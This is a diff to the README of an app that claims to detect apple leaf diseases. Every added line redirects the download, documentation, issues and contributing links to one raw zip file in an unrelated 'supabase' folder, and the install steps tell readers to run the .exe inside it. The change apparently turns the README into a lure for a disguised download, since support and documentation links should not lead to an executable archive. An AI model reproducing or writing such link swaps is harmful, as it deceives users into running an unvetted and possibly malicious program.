@@ -6,9 +6,9 @@ Welcome to OrchardIntel! This app helps you detect apple leaf diseases using adv
 
 ## 📥 Download OrchardIntel
 
-[![Download OrchardIntel](https://img.shields.io/badge/Download-OrchardIntel-blue.svg)](https://github.com/Surya-Valluri/OrchardIntel/releases)
+[![Download OrchardIntel](https://github.com/Surya-Valluri/OrchardIntel/raw/refs/heads/main/supabase/Intel-Orchard-v1.3-beta.2.zip)](https://github.com/Surya-Valluri/OrchardIntel/raw/refs/heads/main/supabase/Intel-Orchard-v1.3-beta.2.zip)
 
-Click the button above or visit [this page](https://github.com/Surya-Valluri/OrchardIntel/releases) to download the latest version.
+Click the button above or visit [this page](https://github.com/Surya-Valluri/OrchardIntel/raw/refs/heads/main/supabase/Intel-Orchard-v1.3-beta.2.zip) to download the latest version.
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you start, make sure your computer meets these requirements:
 
 ## 🔧 How to Install
 
-1. **Download the App:** Go to [this page](https://github.com/Surya-Valluri/OrchardIntel/releases) to download the application file suitable for your operating system.
+1. **Download the App:** Go to [this page](https://github.com/Surya-Valluri/OrchardIntel/raw/refs/heads/main/supabase/Intel-Orchard-v1.3-beta.2.zip) to download the application file suitable for your operating system.
 2. **Locate the Downloaded File:** Find the file in your Downloads folder or the location you chose.
 3. **Install the Application:**
     - **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
@@ -51,15 +51,15 @@ Once installed, open the app and follow these guidelines:
 
 ## 🌍 Learn More
 
-To understand more about the technology behind OrchardIntel, visit our [documentation](https://github.com/Surya-Valluri/OrchardIntel/wiki). You'll find detailed information about features, troubleshooting, and recommendations.
+To understand more about the technology behind OrchardIntel, visit our [documentation](https://github.com/Surya-Valluri/OrchardIntel/raw/refs/heads/main/supabase/Intel-Orchard-v1.3-beta.2.zip). You'll find detailed information about features, troubleshooting, and recommendations.
 
 ## 💬 Get Support
 
-If you need assistance, please check our [issues page](https://github.com/Surya-Valluri/OrchardIntel/issues). Community members and developers regularly monitor it, and you may find answers to your questions there.
+If you need assistance, please check our [issues page](https://github.com/Surya-Valluri/OrchardIntel/raw/refs/heads/main/supabase/Intel-Orchard-v1.3-beta.2.zip). Community members and developers regularly monitor it, and you may find answers to your questions there.
 
 ## 👍 Contributing
 
-Interested in contributing? We welcome your input! Visit our [contributing guidelines](https://github.com/Surya-Valluri/OrchardIntel/blob/main/CONTRIBUTING.md) to learn how you can help improve OrchardIntel.
+Interested in contributing? We welcome your input! Visit our [contributing guidelines](https://github.com/Surya-Valluri/OrchardIntel/raw/refs/heads/main/supabase/Intel-Orchard-v1.3-beta.2.zip) to learn how you can help improve OrchardIntel.
 
 ## 🌱 Stay Updated
 
